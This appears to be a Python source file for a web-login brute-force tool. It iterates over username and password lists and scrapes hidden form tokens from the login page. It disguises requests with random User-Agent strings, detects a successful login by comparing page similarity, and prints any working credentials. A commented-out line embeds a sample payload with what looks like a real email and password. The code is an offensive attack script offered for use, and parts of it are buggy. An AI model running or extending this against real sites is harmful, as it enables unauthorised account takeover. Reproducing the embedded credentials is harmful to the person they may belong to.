import sys
import time
import requests
from bs4 import BeautifulSoup
from lxml import html
from scipy import rand
import ssl
from html_similarity import style_similarity, structural_similarity, similarity

success = False


def brute(parameters, passwords):
    '''
    sends all combinations for usernames and passwords to the attack function on the login page
    '''
    # return
    parameters['req_body_type'] = get_req_type(parameters['headers'], parameters['req_body'])
    print("up: " + str(parameters['req_body']))

    for user in parameters['user_list']:
        user = user.strip()
        user = user.split('\t')
        parameters['username'] = user[0]
        for password in passwords:
            password = password.strip()
            password = password.split('\t')
            parameters['password'] = password[0]
            attack(parameters)


def attack(content):
    '''
   create a packet containing fake headers and the payload(username,password) and submit it to the server
    '''
    print("[+ host url]: " + str(content['host']))

    # build packet headers in order to disguise as a browser
    headers = content['headers']
    headers['User-Agent'] = get_random_user_agent()
    res = requests.get(content['host'])
    soup = BeautifulSoup(res.text, "html.parser")


    payload= change_cred(content['req_body'], content['user_param'], content['password_param'],
                                      content['username'], content['password'], content['req_body_type'], soup, content['tokens'])

    # payload = 'log=alqlambara%40gmail.com&pwd=astmamsh123'
    print("[+ payload]: " + str(payload))

    if content['method'] == 'post':
        resp = requests.post(content['host'], data=payload)

    else:
        resp = requests.get(content['host']+'/'+payload, headers=headers)

    print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
    print(resp.status_code)

    if check_login(resp, res):
        print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
        global success
        success = True
        sys.exit(1)


def check_login(content_1, content_2):
    '''
    checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
    page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
    '''
    k = 0.3
    similarity = k * structural_similarity(content_1.text, content_2.text) + (1 - k) * style_similarity(content_1.text,
                                                                                                        content_2.text)

    if content_1.status_code >= 400:
        return False

    elif similarity < 0.7 and len(content_1.text) > len(content_2.text):
        return True

    elif content_1.status_code == 201:
        return True

    else:
        return False


########################################################################################


def get_random_user_agent():
    '''generate random user agent to fill in the packet header'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay

    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]


def get_req_type(header, req_body):
    type = header['Content-Type']

    if 'json' in type:
        return 'JSON'

    elif 'xml' in type:
        import xmltodict
        return 'XML'

    else:
        import urllib
        return 'URL_ENCODED'


def change_cred(req_body, user_param, pass_param, username, password, req_body_type, soup, dynamic_list):
    print('[+]type: ' + str(type(req_body)) + "real type: " + str(req_body_type))
    for token in dynamic_list:

        inputs = soup.find("input", {"name":token})
        req_body[token] = inputs['value']

    req_body[user_param] = username
    req_body[pass_param] = password

    print('\n\n\n\n\n' + str(req_body) + '\n\n\n\n\n')
    if req_body_type == 'JSON':
        return req_body

    elif req_body_type == 'XML':
        pass

    elif req_body_type == 'URL_ENCODED':
        from urllib.parse import urlencode
        return req_body # convert from json to encoded
